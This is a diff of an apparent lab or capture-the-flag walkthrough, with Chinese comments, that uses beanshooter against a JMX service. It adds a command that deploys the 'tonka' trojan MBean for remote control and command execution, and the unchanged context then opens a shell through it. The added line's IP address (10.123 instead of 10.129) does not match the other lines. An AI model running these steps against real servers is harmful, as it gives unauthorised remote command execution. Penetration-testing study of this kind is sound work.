@@ -40,6 +40,8 @@ $ java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.129.234.57 2222
 ```
 ![失落就不思考了](images/080701.png)
 ```
+$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.123.234.57 2222 tonka
+//tonka 是一个内置攻击性 木马MBean，用于远程控制、文件操作和命令执行
 $ java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.129.234.57 2222
 //Beanshooter 中的 Tonka 模块，执行 shell 命令交互
 ```
